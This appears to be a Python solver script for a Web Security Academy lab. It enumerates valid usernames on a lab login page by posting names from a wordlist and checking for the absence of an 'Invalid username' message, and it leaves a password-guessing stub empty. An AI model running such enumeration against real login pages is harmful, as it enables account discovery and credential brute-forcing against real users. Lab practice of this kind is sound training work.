from requests import post
from pathlib import Path
from ratelimit import limits, RateLimitException, sleep_and_retry

ONE_MINUTE = 60
MAX_CALLS_PER_MINUTE = 30
url = 'https://0a5700cb04b21ea8c0da5f02009600ed.web-security-academy.net/login'
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'Referer': 'https://0a5700cb04b21ea8c0da5f02009600ed.web-security-academy.net/login',

}
cookies = {
    'session': 'EaPnUa21exELsUbGQqJUqSUjiFfRbwyF'
}

@sleep_and_retry
@limits(calls=MAX_CALLS_PER_MINUTE, period=ONE_MINUTE)
def make_user_call(url, line, headers, cookies):
    return post(
                url=url, 
                data={'username': line, 'password': 'asdf'},
                headers=headers,
                cookies=cookies
            )

def user_enum(url, user_file_list, headers, cookies):
    with Path(user_file_list).open('r') as file:
        lines = file.readlines()
        for line in lines:
            res = make_user_call(url, line, headers, cookies)
            if 'Invalid username' not in res.text:
                return line

def pass_enum():
    pass

def main():
    print(
        user_enum(
            url,
            './usernames.txt',
            headers,
            cookies
        )
    )    
